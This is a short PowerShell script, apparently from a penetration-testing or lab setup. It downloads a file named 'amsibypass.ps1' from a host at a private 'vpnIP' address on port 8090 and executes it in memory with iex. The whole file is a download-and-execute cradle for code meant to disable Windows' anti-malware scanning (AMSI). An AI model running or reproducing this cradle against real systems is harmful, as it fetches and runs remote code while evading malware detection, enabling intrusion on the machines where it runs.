#$vpnIP = "172.16.99.56"
$vpnIP = "172.16.53.1"
$fileName = "amsibypass.ps1"
$url = "http://$($vpnIP):8090/$($fileName)"
$wr = [System.NET.WebRequest]::Create($url)
$r = $wr.GetResponse()
iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()